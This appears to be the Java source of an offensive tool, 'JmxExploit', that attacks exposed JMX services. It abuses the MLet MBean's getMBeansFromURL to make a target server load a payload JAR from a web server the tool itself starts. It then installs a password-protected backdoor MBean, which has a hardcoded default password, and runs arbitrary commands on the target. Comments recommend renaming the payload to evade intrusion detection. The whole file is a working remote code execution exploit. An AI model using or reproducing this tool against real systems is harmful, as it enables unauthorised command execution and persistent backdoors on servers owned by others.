package cc.l1k3beef;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import org.apache.commons.cli.*;

import javax.management.*;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.Inet4Address;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;

/**
 * Hello world!
 */
public class JmxExploit {
    // change payloadName to anti IDS
    public static String payloadName = "JmxExploit:name=payload";

    private MBeanServerConnection mBeanServerConnection;

    public void connect(String target, String mode) {
        try {
            JMXServiceURL jmxServiceURL;
            if (mode.equals("jmx_mp")) {
                // select jmx message protocol to connect
                jmxServiceURL = new JMXServiceURL("service:jmx:jmxmp://" + target + "/");
            } else {
                // default use jmx rmi to connect
                jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + target + "/jmxrmi");
            }

            JMXConnector jmxConnector = JMXConnectorFactory.connect(jmxServiceURL);
            this.mBeanServerConnection = jmxConnector.getMBeanServerConnection();
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(-1);
        }
    }

    public void installMBean(String payloadURL) {
        ObjectInstance mLetMBean = null;
        try {
            mLetMBean = this.mBeanServerConnection.createMBean("javax.management.loading.MLet", null);
        } catch (InstanceAlreadyExistsException existsException) {
            try {
                mLetMBean = this.mBeanServerConnection.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
            } catch (Exception e) {
                e.printStackTrace();
                System.exit(-1);
            }
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(-1);
        }

        try {
            // install payload MLet via getMBeansFromURL
            this.mBeanServerConnection.invoke(mLetMBean.getObjectName(),
                    "getMBeansFromURL",
                    new Object[]{payloadURL},
                    new String[]{String.class.getCanonicalName()});
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(-1);
        }
    }

    public boolean checkMBean() {
        try {
            this.mBeanServerConnection.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
            this.mBeanServerConnection.getObjectInstance(new ObjectName(payloadName));
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public void runCMD(String pass, String cmd) {
        try {
            ObjectInstance payloadMBean = this.mBeanServerConnection.getObjectInstance(new ObjectName(payloadName));
            Object resource = this.mBeanServerConnection.invoke(payloadMBean.getObjectName(),
                    "runCMD",
                    new Object[]{pass, cmd},
                    new String[]{String.class.getCanonicalName(), String.class.getCanonicalName()});
            System.out.println(resource);
        } catch (InstanceNotFoundException e) {
            System.out.println("[-] ERROR: execute command after payload installation");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public boolean changePassword(String oldPass, String newPass) {
        try {
            ObjectInstance payloadMBean = this.mBeanServerConnection.getObjectInstance(new ObjectName(payloadName));
            this.mBeanServerConnection.invoke(payloadMBean.getObjectName(),
                    "changePassword",
                    new Object[]{oldPass, newPass},
                    new String[]{String.class.getCanonicalName(), String.class.getCanonicalName()});
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public boolean uninstallMBean() {
        try {
            this.mBeanServerConnection.unregisterMBean(new ObjectName(payloadName));
            this.mBeanServerConnection.unregisterMBean(new ObjectName("DefaultDomain:type=MLet"));
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static Options setOptions() {
        Option targetOption = new Option("t", "target", true, "target endpoint e.g 127.0.0.1:8756");
        targetOption.setRequired(true);
        Option passOption = new Option("p", "pass", true, "set password");
        passOption.setRequired(true);
        Option installOption = new Option("i", "install", false, "install MBean on target server");
        installOption.setRequired(false);
        Option commandOption = new Option("c", "command", true, "run command e.g whoami");
        commandOption.setRequired(false);
        Option shellOption = new Option("s", "shell", false, "interactive shell");
        shellOption.setRequired(false);
        Option modeOption = new Option("m", "mode", true, "jmx connect mode, default jmx_rmi");
        modeOption.setRequired(false);
        Option uninstallOption = new Option("u", "uninstall", false, "uninstall MBean on target server");
        uninstallOption.setRequired(false);

        Options options = new Options();
        options.addOption(targetOption);
        options.addOption(passOption);
        options.addOption(installOption);
        options.addOption(commandOption);
        options.addOption(shellOption);
        options.addOption(modeOption);
        options.addOption(uninstallOption);
        return options;
    }

    public static class FirstHandler implements HttpHandler {

        @Override
        public void handle(HttpExchange httpExchange) {
            try {
                String mletHtml = "<html><mlet code=\"cc.l1k3beef.Payload\" archive=\"" +
                        "JmxExploit.jar" +
                        "\" name=\"" + JmxExploit.payloadName + "\" codebase=\"" +
                        "\"></mlet></html>";
                byte[] buffer = mletHtml.getBytes(StandardCharsets.UTF_8);
                httpExchange.getResponseHeaders().add("Pragma", "no-cache");
                httpExchange.sendResponseHeaders(200, buffer.length);
                OutputStream outputStream = httpExchange.getResponseBody();
                outputStream.write(buffer);
                outputStream.flush();
                outputStream.close();

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static class SecondHandler implements HttpHandler {

        private final String jarPath;

        public SecondHandler(String path) {
            jarPath = path;
        }

        @Override
        public void handle(HttpExchange httpExchange) {
            try {
                httpExchange.getResponseHeaders().add("Content-type", "application/jar");

                File file = new File(this.jarPath);
                FileInputStream fileInputStream = new FileInputStream(file);
                byte[] jar = new byte[(int) file.length()];
                if (fileInputStream.read(jar) <= 0) {
                    System.out.println("read jar failed");
                }
                httpExchange.sendResponseHeaders(200, jar.length);
                OutputStream outputStream = httpExchange.getResponseBody();
                outputStream.write(jar);
                outputStream.flush();
                outputStream.close();

            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }

    public static HttpServer startWebServer(URL path, int port) {
        try {
            HttpServer httpServer = HttpServer.create(new InetSocketAddress(port), 0);
            // change jar name to anti IDS
            httpServer.createContext("/", new FirstHandler());
            httpServer.createContext("/JmxExploit.jar", new SecondHandler(path.getFile()));
            httpServer.setExecutor(Executors.newCachedThreadPool());
            httpServer.start();
            return httpServer;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static int getFreePort() {
        try {
            ServerSocket serverSocket = new ServerSocket(0);
            int port = serverSocket.getLocalPort();
            serverSocket.close();
            return port;
        } catch (Exception e) {
            return 12345;
        }

    }

    public static void main(String[] args) {
        Options options = setOptions();
        HelpFormatter helpFormatter = new HelpFormatter();
        try {
            CommandLineParser commandLineParser = new DefaultParser();
            CommandLine commandLine = commandLineParser.parse(options, args);
            String target = commandLine.getOptionValue("t");
            String pass = commandLine.getOptionValue("p");
            String mode = commandLine.getOptionValue("m", "jmx_rmi");

            JmxExploit jmxExploit = new JmxExploit();
            if (commandLine.hasOption("i")) {
                String host = Inet4Address.getLocalHost().getHostAddress();
                int port = getFreePort();
                String url = commandLine.getOptionValue("i", "http://" + host + ":" + port);
                URL path = jmxExploit.getClass().getProtectionDomain().getCodeSource().getLocation();
                HttpServer httpServer = startWebServer(path, port);
                if (httpServer == null) {
                    System.out.println("[-] ERROR: startWebServer to host payload failed");
                    return;
                }

                jmxExploit.connect(target, mode);
                jmxExploit.installMBean(url);

                // set 10 seconds for the target to load payloadMbean from webserver
                System.out.println("[+] wait 10 seconds for target loading payload...");
                Thread.sleep(10 * 1000);
                httpServer.stop(0);

                if (!jmxExploit.checkMBean()) {
                    System.out.println("[-] ERROR: installMBean failed");
                    return;
                }

                // change pass after installation
                if (jmxExploit.changePassword("l1k3beef_1s_GR34T!", pass)) {
                    System.out.println("[+] inject payload to target succeed");
                }
            }
            if (commandLine.hasOption("u")) {
                jmxExploit.connect(target, mode);
                if (jmxExploit.uninstallMBean()) {
                    System.out.println("[+] uninstallMBean succeed");
                } else {
                    System.out.println("[-] ERROR: uninstallMBean failed");
                }
                return;
            }

            if (commandLine.hasOption("c")) {
                String cmd = commandLine.getOptionValue("c");
                jmxExploit.connect(target, mode);
                jmxExploit.runCMD(pass, cmd);
            } else if (commandLine.hasOption("s")) {
                System.out.println("TODO: support interactive shell");
            } else {
                helpFormatter.printHelp("java -jar JmxExploit.jar -t host:port -p pass -c whoami -i", options);
            }

        } catch (Exception e) {
            e.printStackTrace();
            helpFormatter.printHelp("java -jar JmxExploit.jar -t host:port -p pass -c whoami -i", options);
        }
    }


}
